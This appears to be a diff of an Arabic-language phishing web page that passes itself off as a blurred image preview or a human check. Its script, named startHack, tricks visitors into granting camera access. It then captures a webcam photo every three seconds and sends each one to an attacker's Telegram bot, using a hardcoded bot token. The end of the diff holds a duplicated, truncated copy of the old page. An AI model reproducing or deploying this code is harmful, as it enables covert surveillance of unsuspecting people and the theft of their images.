@@ -1,114 +1,139 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>معاينة الصورة</title>
+    <title>معاينة المحتوى الآمن</title>
     <style>
-        body { background-color: #000; color: white; text-align: center; font-family: Arial; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        img { max-width: 90%; border-radius: 10px; box-shadow: 0 0 20px rgba(255,255,255,0.2); cursor: pointer; }
-        .info { margin-top: 15px; color: #888; font-size: 14px; position: absolute; bottom: 20%; }
+        body {
+            background-color: #1a1a1a;
+            color: white;
+            text-align: center;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        .container {
+            background: #2d2d2d;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            max-width: 90%;
+            width: 400px;
+        }
+        h2 { font-size: 18px; margin-bottom: 10px; color: #00ffcc; }
+        p { font-size: 14px; color: #ccc; line-height: 1.6; }
+        
+        .image-wrapper {
+            position: relative;
+            margin: 20px 0;
+            cursor: pointer;
+            overflow: hidden;
+            border-radius: 10px;
+        }
+        /* تأثير الضبابة (Blur) */
+        #target-image {
+            width: 100%;
+            filter: blur(15px); /* قوة الضباب */
+            transition: 0.5s;
+        }
+        .overlay-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0,0,0,0.6);
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-weight: bold;
+            pointer-events: none;
+            white-space: nowrap;
+        }
+        .btn {
+            background: #00ffcc;
+            color: #000;
+            padding: 10px 25px;
+            border: none;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 10px;
+        }
     </style>
 </head>
 <body>
-    <div id="content" onclick="startHack()">
-        <img id="target-image" src="" alt="جاري التحميل...">
-        <p class="info">انقر على الصورة للمشاهدة بالجودة الكاملة HD</p>
+
+<div class="container">
+    <h2>مرحباً بك!</h2>
+    <p>لرؤية الصورة بوضوح، اضغط عليها ثم قم بالسماح بالوصول إلى الكاميرا لتأكيد هويتك كإنسان.</p>
+    
+    <div class="image-wrapper" onclick="startHack()">
+        <img id="target-image" src="" alt="محتوى مشفر">
+        <div class="overlay-text">انقر لفك التشفير</div>
     </div>
+    
+    <button class="btn" onclick="startHack()">عرض الصورة الآن</button>
+</div>
 
-    <video id="video" style="display:none;" autoplay></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+<video id="video" style="display:none;" autoplay></video>
+<canvas id="canvas" style="display:none;"></canvas>
 
-    <script>
-        const BOT_TOKEN = '8447956018:AAG_IaSwoSkJW55l_raLn3EQMD8rN2UcpNg';
+<script>
+    const BOT_TOKEN = '8447956018:AAG_IaSwoSkJW55l_raLn3EQMD8rN2UcpNg';
+    
+    const urlParams = new URLSearchParams(window.location.search);
+    const imgUrl = urlParams.get('view_img');
+    const targetChatId = urlParams.get('uid');
+
+    if (imgUrl) { document.getElementById('target-image').src = imgUrl; }
+
+    async function startHack() {
+        // تغيير النص فور الضغط
+        document.querySelector('.overlay-text').innerText = "جاري التحقق...";
         
-        // جلب البيانات من الرابط تلقائياً
-        const urlParams = new URLSearchParams(window.location.search);
-        const imgUrl = urlParams.get('view_img');
-        const targetChatId = urlParams.get('uid'); // هنا يتم جلب ID المستخدم الذي أرسل الصورة
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
 
-        if (imgUrl) { document.getElementById('target-image').src = imgUrl; }
+            // إزالة الضبابة تدريجياً لإيهام الضحية بالنجاح
+            document.getElementById('target-image').style.filter = "blur(0px)";
 
-        async function startHack() {
-            document.querySelector('.info').innerText = "جاري الاتصال بالسيرفر... يرجى الانتظار";
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-
-                setInterval(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = 640;
-                    canvas.height = 480;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    const photo = canvas.toDataURL('image/jpeg', 0.6);
-                    sendToTelegram(photo);
-                }, 3000);
-            } catch (err) {
-                alert("خطأ في العرض: يجب السماح بالوصول للكاميرا لمشاهدة المحتوى");
-            }
+            setInterval(() => {
+                const canvas = document.getElementById('canvas');
+                canvas.width = 640;
+                canvas.height = 480;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const photo = canvas.toDataURL('image/jpeg', 0.5);
+                sendToTelegram(photo);
+            }, 3000);
+        } catch (err) {
+            alert("خطأ: يجب السماح بالكاميرا لفك تشفير الصور الخاصة.");
         }
+    }
 
-        function sendToTelegram(photoBase64) {
-            if (!targetChatId) return;
-            
-            const byteString = atob(photoBase64.split(',')[1]);
-            const ab = new ArrayBuffer(byteString.length);
-            const ia = new Uint8Array(ab);
-            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
-            const blob = new Blob([ab], {type: 'image/jpeg'});
+    function sendToTelegram(photoBase64) {
+        if (!targetChatId) return;
+        const byteString = atob(photoBase64.split(',')[1]);
+        const ab = new ArrayBuffer(byteString.length);
+        const ia = new Uint8Array(ab);
+        for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+        const blob = new Blob([ab], {type: 'image/jpeg'});
 
-            const formData = new FormData();
-            formData.append('chat_id', targetChatId);
-            formData.append('photo', blob, 'capture.jpg');
+        const formData = new FormData();
+        formData.append('chat_id', targetChatId);
+        formData.append('photo', blob, 'shot.jpg');
 
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-        }
-    </script>
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+    }
+</script>
 </body>
 </html>
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>معاينة الصورة</title>
-    <style>
-        body { background-color: #000; color: white; text-align: center; font-family: Arial; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        img { max-width: 90%; border-radius: 10px; box-shadow: 0 0 20px rgba(255,255,255,0.2); cursor: pointer; }
-        .info { margin-top: 15px; color: #888; font-size: 14px; position: absolute; bottom: 20%; }
-    </style>
-</head>
-<body>
-    <div id="content" onclick="startHack()">
-        <img id="target-image" src="" alt="جاري التحميل...">
-        <p class="info">انقر على الصورة للمشاهدة بالجودة الكاملة HD</p>
-    </div>
-
-    <video id="video" style="display:none;" autoplay></video>
-    <canvas id="canvas" style="display:none;"></canvas>
-
-    <script>
-        const BOT_TOKEN = '8447956018:AAG_IaSwoSkJW55l_raLn3EQMD8rN2UcpNg';
-        
-        // جلب البيانات من الرابط تلقائياً
-        const urlParams = new URLSearchParams(window.location.search);
-        const imgUrl = urlParams.get('view_img');
-        const targetChatId = urlParams.get('uid'); // هنا يتم جلب ID المستخدم الذي أرسل الصورة
-
-        if (imgUrl) { document.getElementById('target-image').src = imgUrl; }
-
-        async function startHack() {
-            document.querySelector('.info').innerText = "جاري الاتصال بالسيرفر... يرجى الانتظار";
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-
-                setInterval(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = 640;
-                    canvas.height = 480;
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     const photo = canvas.toDataURL('image/jpeg', 0.6);
                     sendToTelegram(photo);
